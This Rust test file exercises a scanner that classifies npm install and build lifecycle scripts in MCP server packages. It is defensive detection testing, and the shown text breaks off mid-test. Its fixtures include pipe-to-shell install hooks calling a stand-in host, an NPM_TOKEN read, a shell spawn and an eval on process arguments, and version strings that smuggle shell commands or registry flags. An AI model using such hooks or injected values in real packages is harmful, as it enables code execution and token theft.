//! Tests for the lifecycle-script classifier (`scanner::lifecycle`).
//!
//! The benign shapes are reduced from published MCP servers in the clean
//! corpus (the Microsoft platform launchers, Postman's only-allow guard,
//! build-only `prepare` scripts); every attack variant is a small change to
//! one of them that must keep the pack's original severity. No fixture here
//! deletes anything outside its own package: the path validator is tested on
//! strings alone.
//!
//! Listed in `.sigilignore` with the other detection-engine test inputs.

use std::fs;
use std::path::Path;

use super::lifecycle::{
    inert_source, is_package_relative_path, Source, Spec, TITLE_BUILD, TITLE_GUARD, TITLE_INERT,
    TITLE_LAUNCHER,
};
use super::{run_scan, Finding, ScanResult, Severity, Verdict};

fn write_tree(root: &Path, entries: &[(&str, &str)]) {
    for (rel, body) in entries {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, body).unwrap();
    }
}

fn scan(entries: &[(&str, &str)]) -> ScanResult {
    let dir = tempfile::tempdir().unwrap();
    write_tree(dir.path(), entries);
    run_scan(dir.path(), None, None)
}

fn rules(r: &ScanResult) -> Vec<(String, Severity)> {
    r.findings
        .iter()
        .map(|f| (f.rule.clone(), f.severity))
        .collect()
}

fn find<'a>(r: &'a ScanResult, rule: &str) -> Option<&'a Finding> {
    r.findings.iter().find(|f| f.rule == rule)
}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/// The Microsoft platform-launcher manifest (`@azure/mcp`,
/// `@microsoft/fabric-mcp`), reduced.
const LAUNCHER_MANIFEST: &str = r#"{
  "name": "@acme/tool-mcp",
  "version": "1.4.0",
  "bin": {
    "acme-mcp": "./index.js"
  },
  "optionalDependencies": {
    "@acme/tool-mcp-darwin-arm64": "1.4.0",
    "@acme/tool-mcp-linux-x64": "1.4.0",
    "@acme/tool-mcp-win32-x64": "1.4.0"
  },
  "scripts": {
    "postinstall": "node ./scripts/post-install-script.js"
  }
}
"#;

/// The postinstall those packages ship, verbatim in shape.
const INERT_POSTINSTALL: &str = r#"const os = require('os');

const platform = os.platform();
const arch = os.arch();

let baseName = '';
try{
    const packageJson = require('../package.json');
    baseName = packageJson.name;
}
catch (err) {
  console.error('Unable to verify platform package installation. Error reading package.json.');
  process.exit(1);
}

const requiredPackage = `${baseName}-${platform}-${arch}`;
try {
  require.resolve(requiredPackage);
} catch (err) {
  console.error(`Missing required package: '${requiredPackage}'. See https://aka.ms/azmcp/troubleshooting`);
  process.exit(1);
}
"#;

/// The launcher `bin` script, reduced from `@microsoft/fabric-mcp`.
const LAUNCHER: &str = r#"#!/usr/bin/env node

const os = require('os')
const packageJson = require('./package.json')

const platform = os.platform()
const arch = os.arch()

const packageName = packageJson.name
const packageVersion = packageJson.version
const platformPackageName = `${packageName}-${platform}-${arch}`

let platformPackage
try {
  platformPackage = require(platformPackageName)
} catch (err) {
  const { execSync } = require('child_process')
  console.error(`Installing missing platform package: ${platformPackageName}`)
  try {
    execSync(`npm install ${platformPackageName}@${packageVersion}`, {
      stdio: ['inherit', 'inherit', 'pipe'],
      timeout: 60000
    })
  } catch (npmErr) {
    execSync(`npm install ${platformPackageName}@${packageVersion} --no-save --prefer-online`, {
      stdio: ['inherit', 'inherit', 'pipe'],
      timeout: 60000
    })
  }
  platformPackage = require(platformPackageName)
}
platformPackage.run(process.argv.slice(2))
"#;

/// `@azure/mcp`'s second form: the command in a constant, the options in
/// another, the call adding one flag.
const LAUNCHER_CONST: &str = r#"#!/usr/bin/env node
const os = require('os')
const packageJson = require('./package.json')
const platform = os.platform()
const arch = os.arch()
const packageName = packageJson.name
const packageVersion = packageJson.version
const platformPackageName = `${packageName}-${platform}-${arch}`

function cacheRoot() {
  if (platform === 'win32') {
    return 'AppData'
  }
  return (packageJson.engines || {}).node
}

function install(installDir) {
  const { execSync } = require('child_process')
  const installOptions = {
    cwd: installDir,
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 60000
  }
  const installCommand = `npm install ${platformPackageName}@${packageVersion} --no-save --no-audit --no-fund --prefix .`
  try {
    execSync(installCommand, installOptions)
  } catch (npmErr) {
    execSync(`${installCommand} --prefer-online`, installOptions)
  }
}
install(process.argv[2])
"#;

fn microsoft_shape() -> Vec<(&'static str, String)> {
    vec![
        ("package/package.json", LAUNCHER_MANIFEST.to_string()),
        (
            "package/scripts/post-install-script.js",
            INERT_POSTINSTALL.to_string(),
        ),
        ("package/index.js", LAUNCHER.to_string()),
    ]
}

/// The Microsoft postinstall in a manifest that installs nothing: the shape
/// `INSTALL-010` still rewrites. (The launcher manifest's optional platform
/// packages are dependencies the install adds before the postinstall runs,
/// so there it stays `INSTALL-003`.) The `INSTALL-003` attack variants below
/// each change one thing about this shape, so each stays Critical because of
/// that change, not because of the dependency rule.
const INERT_MANIFEST: &str = r#"{
  "name": "@acme/tool-mcp",
  "version": "1.4.0",
  "scripts": {
    "postinstall": "node ./scripts/post-install-script.js"
  }
}
"#;

fn inert_shape() -> Vec<(&'static str, String)> {
    vec![
        ("package/package.json", INERT_MANIFEST.to_string()),
        (
            "package/scripts/post-install-script.js",
            INERT_POSTINSTALL.to_string(),
        ),
    ]
}

fn scan_owned(entries: &[(&str, String)]) -> ScanResult {
    let borrowed: Vec<(&str, &str)> = entries.iter().map(|(p, b)| (*p, b.as_str())).collect();
    scan(&borrowed)
}

/// `entries` with `path` replaced (or added).
fn with(
    mut entries: Vec<(&'static str, String)>,
    path: &'static str,
    body: &str,
) -> Vec<(&'static str, String)> {
    entries.retain(|(p, _)| *p != path);
    entries.push((path, body.to_string()));
    entries
}

// ---------------------------------------------------------------------------
// Titles agree with the pack
// ---------------------------------------------------------------------------

#[test]
fn titles_match_the_documented_engine_rules() {
    let corpus = crate::corpus::compiled::corpus();
    for (id, title) in [
        ("INSTALL-010", TITLE_INERT),
        ("INSTALL-011", TITLE_GUARD),
        ("INSTALL-012", TITLE_BUILD),
        ("CODE-016", TITLE_LAUNCHER),
    ] {
        assert_eq!(corpus.rule_meta(id).expect(id).title, title, "{id}");
    }
}

// ---------------------------------------------------------------------------
// The benign shapes
// ---------------------------------------------------------------------------

/// com.microsoft/azure, microsoft-fabric, template-server-name: CRITICAL
/// on the postinstall, HIGH on the launcher. The launcher installs the
/// package's own platform build, so CODE-016 Medium. The postinstall script
/// is inert, but the three optional platform packages are installed before
/// it runs and any of them could link a `node` bin that runs in place of the
/// interpreter; nothing in the package rules that out, so INSTALL-003 stays
/// Critical. (Before the dependency rule this shape was INSTALL-010 Medium;
/// the rewrite itself is now pinned on the dependency-free shape below.)
#[test]
fn the_microsoft_launcher_shape_keeps_its_postinstall_critical() {
    let r = scan_owned(&microsoft_shape());
    let found = rules(&r);
    assert!(
        found
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "{found:?}"
    );
    assert!(
        !found
            .iter()
            .any(|(id, _)| id == "INSTALL-010" || id == "CODE-014" || id == "SKILL-006"),
        "{found:?}"
    );
    let launches: Vec<&Finding> = r.findings.iter().filter(|f| f.rule == "CODE-016").collect();
    assert_eq!(launches.len(), 2, "{found:?}");
    assert!(launches.iter().all(|f| f.severity == Severity::Medium));
    assert_eq!(r.verdict, Verdict::CriticalRisk, "{found:?}");
}

/// The same inert postinstall in a manifest with nothing to install: nothing
/// but the real interpreter can be `node`, so INSTALL-010, Medium.
#[test]
fn an_inert_postinstall_with_no_dependencies_is_medium() {
    let r = scan_owned(&inert_shape());
    let found = rules(&r);
    assert!(
        !found
            .iter()
            .any(|(id, _)| id == "INSTALL-003" || id == "SKILL-006"),
        "{found:?}"
    );
    let inert = find(&r, "INSTALL-010").expect("INSTALL-010");
    assert_eq!(inert.severity, Severity::Medium);
    assert!(inert.snippet.starts_with(TITLE_INERT), "{}", inert.snippet);
    assert!(inert.snippet.contains("os"), "{}", inert.snippet);
    assert_eq!(r.verdict, Verdict::MediumRisk, "{found:?}");
}

#[test]
fn the_constant_command_launcher_form_is_medium() {
    let entries = with(microsoft_shape(), "package/index.js", LAUNCHER_CONST);
    let r = scan_owned(&entries);
    let found = rules(&r);
    assert!(!found.iter().any(|(id, _)| id == "CODE-014"), "{found:?}");
    assert!(find(&r, "CODE-016").is_some(), "{found:?}");
}

/// com.postman/postman-mcp-server: `npx only-allow pnpm` in two manifests.
#[test]
fn the_postman_only_allow_shape_is_low() {
    let manifest = r#"{
  "name": "postman-mcp",
  "version": "2.0.0",
  "scripts": {
    "preinstall": "npx only-allow pnpm",
    "build": "tsc"
  },
  "devDependencies": { "typescript": "^5.9.3" }
}
"#;
    let r = scan(&[
        ("package/package.json", manifest),
        ("package/dist/package.json", manifest),
        ("package/dist/index.js", "console.log('hi')\n"),
    ]);
    let found = rules(&r);
    let guards: Vec<&Finding> = r
        .findings
        .iter()
        .filter(|f| f.rule == "INSTALL-011")
        .collect();
    assert_eq!(guards.len(), 2, "{found:?}");
    assert!(guards.iter().all(|f| f.severity == Severity::Low));
    assert!(!found
        .iter()
        .any(|(id, _)| id == "INSTALL-003" || id == "SKILL-006"));
    assert_eq!(r.verdict, Verdict::LowRisk, "{found:?}");
}

/// `prepare: npm run build` with a tsc/chmod/shx build is a build step.
#[test]
fn build_only_prepare_scripts_are_low() {
    for (scripts, deps) in [
        (
            r#""build": "tsc && shx chmod +x dist/*.js", "prepare": "npm run build""#,
            r#""typescript": "^5.9.3", "shx": "^0.4.0""#,
        ),
        (
            r#""build": "tsc", "prepare": "npm run build""#,
            r#""typescript": "^5.6.0""#,
        ),
        (r#""prepare": "husky || true""#, r#""husky": "^9.1.7""#),
        (r#""prepare": "husky""#, r#""husky": "9.1.7""#),
        (
            r#""build": "shx rm -rf dist && tsc --project tsconfig.build.json", "prepublish": "npm run build && shx chmod +x dist/index.js""#,
            r#""typescript": "^5.8.2", "shx": "^0.3.4""#,
        ),
        (
            r#""clean": "rimraf ./dist", "build": "npm run clean && tsc -b && chmod +x dist/index.js", "prepare": "npm run build""#,
            r#""typescript": "5.9.3", "rimraf": "6.0.1""#,
        ),
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }},\n  \"devDependencies\": {{ {deps} }}\n}}\n"
        );
        let r = scan(&[
            ("package.json", &manifest),
            ("dist/index.js", "console.log(1)\n"),
        ]);
        let found = rules(&r);
        assert!(
            found
                .iter()
                .any(|(id, s)| id == "INSTALL-012" && *s == Severity::Low),
            "{scripts}: {found:?}"
        );
        assert!(
            !found.iter().any(|(id, _)| id == "INSTALL-004"),
            "{scripts}: {found:?}"
        );
        assert_eq!(r.verdict, Verdict::LowRisk, "{scripts}: {found:?}");
    }
}

// ---------------------------------------------------------------------------
// INSTALL-003 attack variants keep Critical
// ---------------------------------------------------------------------------

fn assert_install003_stays_critical(entries: &[(&str, String)], what: &str) {
    let r = scan_owned(entries);
    let found = rules(&r);
    assert!(
        found
            .iter()
            .any(|(id, s)| id == "INSTALL-003" && *s == Severity::Critical),
        "{what}: INSTALL-003 must stay Critical: {found:?}"
    );
    assert!(
        !found
            .iter()
            .any(|(id, _)| id == "INSTALL-010" || id == "INSTALL-011"),
        "{what}: {found:?}"
    );
    assert_eq!(r.verdict, Verdict::CriticalRisk, "{what}");
}

fn postinstall_with(script: &str) -> Vec<(&'static str, String)> {
    with(
        inert_shape(),
        "package/scripts/post-install-script.js",
        script,
    )
}

#[test]
fn a_postinstall_with_any_capability_stays_critical() {
    let cases: &[(&str, &str)] = &[
        (
            "https",
            "const https = require('https');\nhttps.get('https://x.example/p');\n",
        ),
        (
            "child_process",
            "require('child_process').execSync('id');\n",
        ),
        (
            "fs",
            "const fs = require('fs');\nconsole.log(fs.readdirSync('.'));\n",
        ),
        ("require alias", "const r = require;\nr('child_process');\n"),
        ("computed require", "const os = require('o' + 's');\n"),
        (
            "computed os member",
            "const os = require('os');\nconsole.log(os['user' + 'Info']());\n",
        ),
        (
            "os aliased",
            "const o = require('os');\nconsole.log(o.userInfo());\n",
        ),
        (
            "os destructured beyond the allowlist",
            "const { userInfo } = require('os');\nconsole.log(userInfo());\n",
        ),
        ("process computed", "console.log(process['env']);\n"),
        ("process.env", "console.log(process.env.NPM_TOKEN);\n"),
        (
            "process aliased",
            "const p = process;\nconsole.log(p.env);\n",
        ),
        (
            "Buffer",
            "console.log(Buffer.from('aGk=', 'base64').toString());\n",
        ),
        ("hex escape", "const m = '\\x63hild_process';\n"),
        ("unicode escape", "const m = '\\u0063hild_process';\n"),
        (
            "dynamic import",
            "import('https').then(m => m.get('https://x.example'));\n",
        ),
        ("native addon", "require('./addon.node');\n"),
        ("arguments", "const r = arguments[1];\nr('fs');\n"),
        ("this", "const g = (function () { return this; })();\n"),
        ("Reflect", "Reflect.get(console, 'log');\n"),
        ("URL outside console", "const u = 'https://x.example/p';\n"),
        ("IPv4", "const h = '10.0.0.1';\n"),
        ("Function", "const f = Function;\n"),
        ("static import", "import { exec } from 'child_process';\n"),
        ("re-export", "export { exec } from 'child_process';\n"),
        ("with", "with (console) { log(1); }\n"),
    ];
    for (what, script) in cases {
        assert_install003_stays_critical(&postinstall_with(script), what);
        assert!(
            inert_source(script).is_err(),
            "{what} must fail the inert test"
        );
    }
}

#[test]
fn a_required_local_module_is_held_to_the_same_test() {
    let entries = with(
        postinstall_with("const lib = require('./lib.js');\nlib.check();\n"),
        "package/scripts/lib.js",
        "module.exports.check = function () { require('https').get('https://x.example'); };\n",
    );
    assert_install003_stays_critical(&entries, "lib.js uses https");

    // Three hops of local requires is beyond the depth followed.
    let mut deep = postinstall_with("require('./a.js');\n");
    deep = with(deep, "package/scripts/a.js", "require('./b.js');\n");
    deep = with(deep, "package/scripts/b.js", "require('./c.js');\n");
    deep = with(deep, "package/scripts/c.js", "console.log(1);\n");
    assert_install003_stays_critical(&deep, "require chain deeper than two");

    // A module outside the package directory.
    let outside = with(
        postinstall_with("require('../../elsewhere.js');\n"),
        "elsewhere.js",
        "console.log(1);\n",
    );
    assert_install003_stays_critical(&outside, "require outside the package");
}

#[test]
fn an_oversized_non_ascii_or_missing_target_stays_critical() {
    let big = format!(
        "console.log(1);\n{}",
        "// padding padding padding\n".repeat(200)
    );
    assert_install003_stays_critical(&postinstall_with(&big), "over 4 KiB");
    assert_install003_stays_critical(
        &postinstall_with("console.log('caf\u{e9}');\n"),
        "non-ASCII",
    );
    let long_line = format!("console.log('{}');\n", "a".repeat(220));
    assert_install003_stays_critical(&postinstall_with(&long_line), "line over 200 bytes");
    let missing: Vec<(&str, String)> = inert_shape()
        .into_iter()
        .filter(|(p, _)| !p.ends_with("post-install-script.js"))
        .collect();
    assert_install003_stays_critical(&missing, "missing target");
}

fn manifest_with_postinstall(cmd: &str) -> String {
    INERT_MANIFEST.replace("node ./scripts/post-install-script.js", cmd)
}

#[test]
fn any_other_postinstall_command_stays_critical() {
    for cmd in [
        "node -e \\\"console.log(1)\\\"",
        "bun run ./scripts/post-install-script.js",
        "node ./scripts/post-install-script.js && curl -s https://x.example/p | sh",
        "node ../outside.js",
        "node ./scripts/post-install-script.js --flag",
        "node scripts/post-install-script.ts",
    ] {
        let entries = with(
            inert_shape(),
            "package/package.json",
            &manifest_with_postinstall(cmd),
        );
        let entries = with(entries, "package/outside.js", "console.log(1);\n");
        assert_install003_stays_critical(&entries, cmd);
    }
}

#[test]
fn only_allow_variants_stay_critical() {
    let base = |scripts: &str, extra: &str| {
        format!("{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }}{extra}\n}}\n")
    };
    let cases = [
        base(r#""preinstall": "npx only-allow pnpm && node x.js""#, ""),
        base(r#""preinstall": "npx only-allow pnpm; curl -s https://x.example/p | sh""#, ""),
        base(r#""preinstall": "npx only-allow@latest pnpm""#, ""),
        base(r#""preinstall": "npx only-allow pnpm ""#, ""),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"dependencies\": { \"only-allow\": \"^1.2.1\" },\n  \"bundleDependencies\": [\"only-allow\"]",
        ),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"devDependencies\": { \"only-allow\": \"github:x/y\" }",
        ),
        base(
            r#""preinstall": "npx only-allow pnpm""#,
            ",\n  \"overrides\": { \"only-allow\": \"github:x/y\" }",
        ),
    ];
    for manifest in &cases {
        let entries = vec![
            ("package.json", manifest.clone()),
            ("x.js", "1\n".to_string()),
        ];
        assert_install003_stays_critical(&entries, manifest);
    }
    // A shipped node_modules beside the manifest: npx would run it.
    let dir = tempfile::tempdir().unwrap();
    write_tree(
        dir.path(),
        &[
            (
                "package.json",
                &base(r#""preinstall": "npx only-allow pnpm""#, ""),
            ),
            (
                "node_modules/only-allow/bin.js",
                "require('child_process')\n",
            ),
        ],
    );
    let r = run_scan(dir.path(), None, None);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-003"),
        "{:?}",
        rules(&r)
    );
}

#[test]
fn a_binding_gyp_keeps_the_postinstall_critical() {
    let entries = with(
        inert_shape(),
        "package/binding.gyp",
        "{ \"targets\": [] }\n",
    );
    assert_install003_stays_critical(&entries, "binding.gyp beside the manifest");
}

/// A lifecycle key that is not a top-level script (a nested object, or a
/// string) cannot be classified and keeps the pack's severity.
#[test]
fn a_lifecycle_key_outside_scripts_is_not_classified() {
    let manifest = "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"npx only-allow pnpm\"},\"config\":{\"preinstall\":\"curl -s https://x.example/p | sh\"}}\n";
    let entries = vec![("package.json", manifest.to_string())];
    assert_install003_stays_critical(&entries, "second key on the line is not a script");
}

// ---------------------------------------------------------------------------
// CODE-014 launcher variants keep High
// ---------------------------------------------------------------------------

fn assert_code014_stays(entries: &[(&str, String)], what: &str) {
    let r = scan_owned(entries);
    let found = rules(&r);
    assert!(
        found
            .iter()
            .any(|(id, s)| id == "CODE-014" && *s == Severity::High),
        "{what}: CODE-014 must stay High: {found:?}"
    );
}

#[test]
fn launcher_variants_keep_code014() {
    let launcher = |from: &str, to: &str| {
        assert!(LAUNCHER.contains(from), "fixture drifted: {from}");
        with(
            microsoft_shape(),
            "package/index.js",
            &LAUNCHER.replace(from, to),
        )
    };
    let cases: Vec<(&str, Vec<(&'static str, String)>)> = vec![
        (
            "foreign literal package",
            launcher(
                "const platformPackageName = `${packageName}-${platform}-${arch}`",
                "const platformPackageName = 'left-pad'",
            ),
        ),
        (
            "package from the environment",
            launcher(
                "const packageName = packageJson.name",
                "const packageName = process.env.PKG",
            ),
        ),
        (
            "version from the environment",
            launcher(
                "const packageVersion = packageJson.version",
                "const packageVersion = process.env.VER",
            ),
        ),
        (
            "registry flag",
            launcher(
                "@${packageVersion} --no-save --prefer-online`",
                "@${packageVersion} --registry=https://x.example`",
            ),
        ),
        (
            "unknown flag",
            launcher(
                "@${packageVersion} --no-save --prefer-online`",
                "@${packageVersion} --userconfig --no-save`",
            ),
        ),
        (
            "another runner",
            launcher(
                "execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
                "execSync(`${bunCmd} add -g ${platformPackageName}`, {",
            ),
        ),
        (
            "reassigned variable",
            launcher(
                "const platformPackageName = `${packageName}-${platform}-${arch}`",
                "let platformPackageName = `${packageName}-${platform}-${arch}`\nplatformPackageName = process.env.EVIL",
            ),
        ),
        (
            "second declaration",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const platformPackageName = process.env.EVIL\n  const { execSync }",
            ),
        ),
        (
            "another shell call on the same line",
            launcher(
                "    execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
                "    require('child_process').spawn('sh', ['-c', process.argv[2]]); execSync(`npm install ${platformPackageName}@${packageVersion}`, {",
            ),
        ),
        (
            "for-of rebinding",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  for (platformPackageName of process.argv) {}\n  const { execSync }",
            ),
        ),
        (
            "nested destructured parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const run = function ({ a: { platformPackageName } }) { return platformPackageName }\n  const { execSync }",
            ),
        ),
        (
            "rest element",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const { ...platformPackageName } = process.env\n  const { execSync }",
            ),
        ),
        (
            "arrow parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (err) {\n  const go = (platformPackageName) => platformPackageName\n  const { execSync }",
            ),
        ),
        (
            "shadowing parameter",
            launcher(
                "} catch (err) {\n  const { execSync }",
                "} catch (platformPackageName) {\n  const { execSync }",
            ),
        ),
        (
            "manifest from elsewhere",
            launcher(
                "const packageJson = require('./package.json')",
                "const packageJson = require('./other/package.json')",
            ),
        ),
        (
            "env in the options",
            launcher(
                "      stdio: ['inherit', 'inherit', 'pipe'],\n      timeout: 60000\n    })\n  } catch (npmErr) {",
                "      env: { npm_config_registry: 'https://x.example' },\n      timeout: 60000\n    })\n  } catch (npmErr) {",
            ),
        ),
        (
            "shell in the options",
            launcher(
                "      stdio: ['inherit', 'inherit', 'pipe'],\n      timeout: 60000\n    })\n  } catch (npmErr) {",
                "      shell: './sh',\n      timeout: 60000\n    })\n  } catch (npmErr) {",
            ),
        ),
    ];
    for (what, entries) in cases {
        assert_code014_stays(&entries, what);
    }

    // Not a bin script.
    let not_bin = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST.replace("\"acme-mcp\": \"./index.js\"", "\"acme-mcp\": \"./cli.js\""),
    );
    assert_code014_stays(&not_bin, "not a bin target");
    // Platform packages at another version.
    let mismatched = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST.replace(
            "\"@acme/tool-mcp-linux-x64\": \"1.4.0\"",
            "\"@acme/tool-mcp-linux-x64\": \"9.9.9\"",
        ),
    );
    assert_code014_stays(&mismatched, "mismatched optional dependency version");
    // Only one platform package.
    let one = with(
        microsoft_shape(),
        "package/package.json",
        &LAUNCHER_MANIFEST
            .replace("    \"@acme/tool-mcp-darwin-arm64\": \"1.4.0\",\n", "")
            .replace("    \"@acme/tool-mcp-linux-x64\": \"1.4.0\",\n", ""),
    );
    assert_code014_stays(&one, "a single platform package");
    // An eval anywhere in the launcher can introduce a binding.
    let evald = with(
        microsoft_shape(),
        "package/index.js",
        &LAUNCHER.replace(
            "let platformPackage\n",
            "let platformPackage\neval(process.argv[2])\n",
        ),
    );
    assert_code014_stays(&evald, "eval in the launcher");
}

/// Hunt finding H1: the launcher interpolates `packageJson.version` and
/// `.name` straight into `execSync(`npm install ${name}@${version}`)`. The
/// CODE-016 rewrite proved only that the *expressions* resolve to the
/// manifest's own name/version, never that the resolved *values* are safe.
/// A `version` field carrying a smuggled flag or shell metacharacter
/// (`"1.4.0 --registry=https://evil.example.com"`), or a `name` with one, must
/// keep CODE-014 High. npm's publish-time semver check does not protect a
/// clone, tarball or local install, which is exactly what Sigil scans.
#[test]
fn launcher_with_an_injected_version_or_name_stays_code014() {
    // The version (and every matching platform spec, which must equal it)
    // carries a flag or a shell metacharacter.
    for poison in [
        "1.4.0 --registry=https://evil.example.com",
        "1.4.0 --unsafe-perm --foreground-scripts",
        "1.4.0;id",
        "1.4.0 && npx acme",
        "1.4.0|tee",
        "1.4.0 $(id)",
        "1.4.0`id`",
        "latest",
        "^1.4.0",
        "1.4.0 ",
    ] {
        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", poison);
        let entries = with(microsoft_shape(), "package/package.json", &manifest);
        assert_code014_stays(&entries, &format!("version {poison:?}"));
    }
    // The control: a clean semver rewrites to CODE-016 (not CODE-014 High).
    let clean = microsoft_shape();
    let r = scan_owned(&clean);
    let found = rules(&r);
    assert!(
        found.iter().any(|(id, _)| id == "CODE-016"),
        "clean launcher should rewrite to CODE-016: {found:?}"
    );
    assert!(
        !found
            .iter()
            .any(|(id, s)| id == "CODE-014" && *s == Severity::High),
        "clean launcher should not keep CODE-014 High: {found:?}"
    );
    // A pre-release / build semver is still a clean rewrite.
    for ok in ["1.4.0-beta.2", "2.0.0-rc.1+build.7", "10.20.30"] {
        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", ok);
        let entries = with(microsoft_shape(), "package/package.json", &manifest);
        let r = scan_owned(&entries);
        let found = rules(&r);
        assert!(
            found.iter().any(|(id, _)| id == "CODE-016"),
            "semver {ok:?} should still rewrite to CODE-016: {found:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// INSTALL-004 build variants keep Medium
// ---------------------------------------------------------------------------

#[test]
fn a_prepare_that_runs_anything_else_stays_medium() {
    for (scripts, deps) in [
        (
            r#""build": "tsc && node x.js", "prepare": "npm run build""#,
            r#""typescript": "^5""#,
        ),
        (r#""prepare": "vite build""#, r#""vite": "^5""#),
        (r#""prepare": "webpack""#, r#""webpack": "^5""#),
        (r#""prepare": "rollup -c""#, r#""rollup": "^4""#),
        (r#""prepare": "eslint .""#, r#""eslint": "^9""#),
        (r#""prepare": "npx tsc""#, r#""typescript": "^5""#),
        (
            r#""prepare": "tsc --outDir /tmp/x""#,
            r#""typescript": "^5""#,
        ),
        (
            r#""prepare": "tsc""#,
            r#""typescript": "github:x/typescript""#,
        ),
        (r#""prepare": "tsc""#, r#""typescript": "npm:evil-ts@1""#),
        (r#""prepare": "tsc""#, r#""typescript": "file:../ts""#),
        (r#""prepare": "npm run missing""#, r#""typescript": "^5""#),
        (
            r#""prepare": "tsc", "postprepare": "node x.js""#,
            r#""typescript": "^5""#,
        ),
        (
            r#""build": "tsc", "prebuild": "node x.js", "prepare": "npm run build""#,
            r#""typescript": "^5""#,
        ),
        (r#""prepare": "tsc > out.txt""#, r#""typescript": "^5""#),
        (
            r#""prepare": "shx cp -r dist ../elsewhere""#,
            r#""shx": "^0.4""#,
        ),
        (r#""prepare": "chmod +x $HOME/x""#, r#""typescript": "^5""#),
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    {scripts}\n  }},\n  \"devDependencies\": {{ {deps} }}\n}}\n"
        );
        let r = scan(&[("package.json", &manifest), ("x.js", "console.log(1)\n")]);
        let found = rules(&r);
        assert!(
            found
                .iter()
                .any(|(id, s)| id == "INSTALL-004" && *s == Severity::Medium),
            "{scripts} / {deps}: INSTALL-004 must stay Medium: {found:?}"
        );
        assert!(
            !found.iter().any(|(id, _)| id == "INSTALL-012"),
            "{scripts}: {found:?}"
        );
    }
}

#[test]
fn a_bundled_or_redirected_build_tool_stays_medium() {
    for extra in [
        ",\n  \"bundleDependencies\": [\"typescript\"]",
        ",\n  \"bundleDependencies\": true",
        ",\n  \"resolutions\": { \"typescript\": \"https://x.example/ts.tgz\" }",
        ",\n  \"resolutions\": { \"**/typescript\": \"https://x.example/ts.tgz\" }",
        ",\n  \"overrides\": { \"foo\": { \"typescript\": \"github:x/ts\" } }",
        ",\n  \"pnpm\": { \"overrides\": { \"typescript@<6\": \"github:x/ts\" } }",
    ] {
        let manifest = format!(
            "{{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{\n    \"prepare\": \"tsc\"\n  }},\n  \"devDependencies\": {{ \"typescript\": \"^5\" }}{extra}\n}}\n"
        );
        let r = scan(&[("package.json", &manifest)]);
        assert!(
            r.findings.iter().any(|f| f.rule == "INSTALL-004"),
            "{extra}: {:?}",
            rules(&r)
        );
    }
    // A lockfile that resolves the tool off the registry.
    let manifest = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" }\n}\n";
    let lock = r#"{"lockfileVersion":3,"packages":{"node_modules/typescript":{"version":"5.9.3","resolved":"https://x.example/typescript-5.9.3.tgz"}}}"#;
    let r = scan(&[("package.json", manifest), ("package-lock.json", lock)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-004"),
        "{:?}",
        rules(&r)
    );
    // An override for a package whose name merely contains the tool's name
    // (io.mailtrap/mcp) is not an override of the tool, but it still swaps a
    // package somewhere in the tree, and a swapped package can link a `tsc`
    // bin once npm hoists it (Codex review of #172, finding B): the finding
    // keeps INSTALL-004. `overrides_in` alone would have let it through.
    let unrelated = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" },\n  \"overrides\": { \"@typescript-eslint/typescript-estree\": { \"minimatch\": \"9.0.7\" } }\n}\n";
    let r = scan(&[("package.json", unrelated)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-004")
            && !r.findings.iter().any(|f| f.rule == "INSTALL-012"),
        "{:?}",
        rules(&r)
    );
    let good_lock = r#"{"lockfileVersion":3,"packages":{"node_modules/typescript":{"version":"5.9.3","resolved":"https://registry.npmjs.org/typescript/-/typescript-5.9.3.tgz"}}}"#;
    let r = scan(&[("package.json", manifest), ("package-lock.json", good_lock)]);
    assert!(
        r.findings.iter().any(|f| f.rule == "INSTALL-012"),
        "{:?}",
        rules(&r)
    );
}

/// A build tool the manifest does not pin as a registry dependency is not a
/// trusted build step: npm prepends `node_modules/.bin` to PATH for lifecycle
/// scripts, so a dependency shipping a `tsc` / `husky` / `rimraf` / `shx` bin
/// runs in place of the real tool, and the manifest never named the real one.
/// Such a `prepare` stays INSTALL-004 Medium, not INSTALL-012 Low.
#[test]
fn an_undeclared_build_tool_stays_medium() {
    // The tool is not declared anywhere.
    for (scripts, deps) in [
        (r#""prepare": "tsc""#, ""),
        (r#""prepare": "husky""#, ""),
        (
            r#""build": "rimraf dist && tsc", "prepare": "npm run build""#,
            "",
        ),
        // typescript is declared but husky, run in the same chain, is not.
        (
            r#""build": "tsc && husky", "prepare": "npm run build""#,
